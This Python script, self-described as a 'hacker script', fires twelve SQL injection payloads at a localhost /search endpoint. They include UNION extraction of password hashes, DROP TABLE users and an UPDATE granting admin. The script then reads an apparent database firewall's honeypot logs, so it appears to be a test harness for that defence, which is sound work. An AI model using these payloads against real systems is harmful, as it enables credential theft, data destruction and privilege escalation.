"""
HACKER SCRIPT - Simulates real SQL injection attacks
This script acts like a real attacker - just uses HTTP requests, no knowledge of the app internals
"""
import requests
import time
import urllib.parse

TARGET = "http://localhost:8000"

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

def print_banner():
    """Print hacker banner"""
    print(f"""
{Colors.RED}{Colors.BOLD}
██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗ 
██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗
███████║███████║██║     █████╔╝ █████╗  ██████╔╝
██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗
██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║
╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
{Colors.RESET}
{Colors.CYAN}Target: {TARGET}{Colors.RESET}
{Colors.YELLOW}Mission: Extract database, steal credentials, gain admin access{Colors.RESET}
""")

def log_attack(num, name, payload):
    """Log attack attempt"""
    print(f"\n{Colors.MAGENTA}{'='*70}{Colors.RESET}")
    print(f"{Colors.RED}[ATTACK #{num}]{Colors.RESET} {Colors.BOLD}{name}{Colors.RESET}")
    print(f"{Colors.YELLOW}Payload:{Colors.RESET} {payload[:100]}...")
    print(f"{Colors.MAGENTA}{'='*70}{Colors.RESET}")

def attack(endpoint, params=None, method="GET"):
    """Execute attack"""
    url = f"{TARGET}{endpoint}"
    
    try:
        if method == "GET":
            resp = requests.get(url, params=params, timeout=5)
        else:
            resp = requests.post(url, json=params, timeout=5)
        
        print(f"{Colors.CYAN}Status:{Colors.RESET} {resp.status_code}")
        
        if resp.status_code == 403:
            print(f"{Colors.RED}[BLOCKED]{Colors.RESET} Security system detected the attack!")
            try:
                data = resp.json()
                print(f"Reason: {data.get('error', 'Unknown')}")
                if data.get('attack_detected'):
                    print(f"{Colors.RED}⚠️  SECURITY ALERT TRIGGERED{Colors.RESET}")
            except:
                pass
            return False
        elif resp.status_code == 200:
            print(f"{Colors.GREEN}[SUCCESS]{Colors.RESET} Attack worked! Got data:")
            try:
                data = resp.json()
                print(f"{Colors.GREEN}{str(data)[:200]}...{Colors.RESET}")
                return True
            except:
                print(resp.text[:200])
                return True
        else:
            print(f"{Colors.YELLOW}[UNKNOWN]{Colors.RESET} Unexpected response")
            return None
            
    except requests.exceptions.ConnectionError:
        print(f"{Colors.RED}[ERROR]{Colors.RESET} Cannot connect to target!")
        print("Is the server running? Start it with: python app.py")
        return None
    except Exception as e:
        print(f"{Colors.RED}[ERROR]{Colors.RESET} {str(e)}")
        return None

def main():
    """Main attack routine"""
    print_banner()
    
    print(f"{Colors.CYAN}[*] Reconnaissance - Discovering endpoints...{Colors.RESET}")
    time.sleep(1)
    
    attacks_total = 0
    attacks_success = 0
    attacks_blocked = 0
    
    # Attack 1: Classic SQL Injection - OR 1=1
    log_attack(1, "Classic SQL Injection (OR 1=1)", "' OR '1'='1")
    result = attack("/search", {"q": "' OR '1'='1"})
    attacks_total += 1
    if result: attacks_success += 1
    elif result == False: attacks_blocked += 1
    time.sleep(1.5)
    
    # Attack 2: UNION-based SQLi - Extract all users
    log_attack(2, "UNION-based SQL Injection", "' UNION SELECT id,username,password_hash,email FROM users--")
    result = attack("/search", {"q": "' UNION SELECT id,username,password_hash,email FROM users--"})
    attacks_total += 1
    if result: attacks_success += 1
    elif result == False: attacks_blocked += 1
    time.sleep(1.5)
    
    # Attack 3: Comment-based bypass
    log_attack(3, "Comment Bypass Attack", "admin'--")
    result = attack("/search", {"q": "admin'--"})
    attacks_total += 1
    if result: attacks_success += 1
    elif result == False: attacks_blocked += 1
    time.sleep(1.5)
    
    # Attack 4: Boolean-based blind SQLi
    log_attack(4, "Boolean-based Blind SQLi", "' AND 1=1--")
    result = attack("/search", {"q": "' AND 1=1--"})
    attacks_total += 1
    if result: attacks_success += 1
    elif result == False: attacks_blocked += 1
    time.sleep(1.5)
    
    # Attack 5: Stacked queries - DROP TABLE
    log_attack(5, "Stacked Queries - DROP TABLE", "'; DROP TABLE users;--")
    result = attack("/search", {"q": "'; DROP TABLE users;--"})
    attacks_total += 1
    if result: attacks_success += 1
    elif result == False: attacks_blocked += 1
    time.sleep(1.5)
    
    # Attack 6: Extract admin credentials
    log_attack(6, "Admin Credential Extraction", "' UNION SELECT username,password_hash,email,role FROM users WHERE role='admin'--")
    result = attack("/search", {"q": "' UNION SELECT username,password_hash,email,role FROM users WHERE role='admin'--"})
    attacks_total += 1
    if result: attacks_success += 1
    elif result == False: attacks_blocked += 1
    time.sleep(1.5)
    
    # Attack 7: Time-based blind SQLi
    log_attack(7, "Time-based Blind SQLi", "' OR SLEEP(5)--")
    result = attack("/search", {"q": "' OR SLEEP(5)--"})
    attacks_total += 1
    if result: attacks_success += 1
    elif result == False: attacks_blocked += 1
    time.sleep(1.5)
    
    # Attack 8: Error-based SQLi
    log_attack(8, "Error-based SQLi", "' AND (SELECT * FROM users)='")
    result = attack("/search", {"q": "' AND (SELECT * FROM users)='"})
    attacks_total += 1
    if result: attacks_success += 1
    elif result == False: attacks_blocked += 1
    time.sleep(1.5)
    
    # Attack 9: Subquery injection
    log_attack(9, "Subquery Injection", "' OR (SELECT COUNT(*) FROM users)>0--")
    result = attack("/search", {"q": "' OR (SELECT COUNT(*) FROM users)>0--"})
    attacks_total += 1
    if result: attacks_success += 1
    elif result == False: attacks_blocked += 1
    time.sleep(1.5)
    
    # Attack 10: Information schema extraction
    log_attack(10, "Schema Extraction", "' UNION SELECT name,sql FROM sqlite_master--")
    result = attack("/search", {"q": "' UNION SELECT name,sql FROM sqlite_master--"})
    attacks_total += 1
    if result: attacks_success += 1
    elif result == False: attacks_blocked += 1
    time.sleep(1.5)
    
    # Attack 11: Hex encoding
    log_attack(11, "Hex Encoding Bypass", "0x61646d696e")
    result = attack("/search", {"q": "0x61646d696e"})
    attacks_total += 1
    if result: attacks_success += 1
    elif result == False: attacks_blocked += 1
    time.sleep(1.5)
    
    # Attack 12: Multi-statement attack
    log_attack(12, "Multi-statement Attack", "'; UPDATE users SET role='admin' WHERE id=1;--")
    result = attack("/search", {"q": "'; UPDATE users SET role='admin' WHERE id=1;--"})
    attacks_total += 1
    if result: attacks_success += 1
    elif result == False: attacks_blocked += 1
    time.sleep(1.5)
    
    # Print summary
    print(f"\n{Colors.MAGENTA}{'='*70}{Colors.RESET}")
    print(f"{Colors.BOLD}ATTACK SUMMARY{Colors.RESET}")
    print(f"{Colors.MAGENTA}{'='*70}{Colors.RESET}")
    print(f"Total Attacks Attempted: {attacks_total}")
    
    if attacks_success > 0:
        print(f"{Colors.GREEN}✓ Successful Attacks: {attacks_success}{Colors.RESET}")
        print(f"{Colors.GREEN}⚠️  DATABASE COMPROMISED! Security breach!{Colors.RESET}")
    else:
        print(f"{Colors.GREEN}✓ Successful Attacks: 0{Colors.RESET}")
    
    if attacks_blocked > 0:
        print(f"{Colors.RED}✗ Blocked Attacks: {attacks_blocked}{Colors.RESET}")
        print(f"{Colors.RED}🛡️  Security system is active and protecting the database!{Colors.RESET}")
    
    success_rate = (attacks_success / attacks_total * 100) if attacks_total > 0 else 0
    block_rate = (attacks_blocked / attacks_total * 100) if attacks_total > 0 else 0
    
    print(f"\nSuccess Rate: {success_rate:.1f}%")
    print(f"Block Rate: {block_rate:.1f}%")
    
    if attacks_success == 0 and attacks_blocked == attacks_total:
        print(f"\n{Colors.GREEN}{Colors.BOLD}[CONCLUSION]{Colors.RESET} {Colors.GREEN}Target is SECURE!{Colors.RESET}")
        print(f"{Colors.GREEN}All attacks were blocked by the security system.{Colors.RESET}")
        print(f"{Colors.GREEN}The database firewall is working perfectly!{Colors.RESET}")
    elif attacks_success > 0:
        print(f"\n{Colors.RED}{Colors.BOLD}[CONCLUSION]{Colors.RESET} {Colors.RED}Target is VULNERABLE!{Colors.RESET}")
        print(f"{Colors.RED}Successfully penetrated the system.{Colors.RESET}")
        print(f"{Colors.RED}Database security needs immediate attention!{Colors.RESET}")
    
    # Check security database logs directly
    print(f"\n{Colors.CYAN}[*] Checking security monitoring system logs...{Colors.RESET}")
    try:
        import sys
        import os
        sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'src'))
        from database_protection.firewall import DatabaseSecurityFirewall
        
        security_db = os.path.join(os.path.dirname(__file__), '..', 'security.db')
        firewall = DatabaseSecurityFirewall(security_db)
        logs = firewall.get_query_logs(limit=20)
        
        blocked_logs = [log for log in logs if log['action'] == 'REDIRECTED_TO_HONEYPOT']
        
        print(f"\n{Colors.YELLOW}Security System Statistics:{Colors.RESET}")
        print(f"  Total Queries Logged: {len(logs)}")
        print(f"  Blocked Queries: {len(blocked_logs)}")
        print(f"  Block Rate: {len(blocked_logs)/len(logs)*100:.1f}%" if logs else "N/A")
        
        if blocked_logs:
            print(f"\n{Colors.YELLOW}Recent Blocked Attacks:{Colors.RESET}")
            for i, log in enumerate(blocked_logs[-5:], 1):
                print(f"\n  {i}. {Colors.RED}{log['reason']}{Colors.RESET}")
                print(f"     Query: {log['query'][:80]}...")
                print(f"     IP: {log['ip_address']} | Time: {log['timestamp']}")
    except Exception as e:
        print(f"{Colors.YELLOW}Note: Could not read security logs: {e}{Colors.RESET}")
        print(f"{Colors.YELLOW}This is normal if the app isn't registered in the dashboard yet.{Colors.RESET}")
    
    print(f"\n{Colors.MAGENTA}{'='*70}{Colors.RESET}")
    print(f"{Colors.RED}Attack session terminated.{Colors.RESET}")
    print(f"{Colors.MAGENTA}{'='*70}{Colors.RESET}\n")

if __name__ == "__main__":
    main()
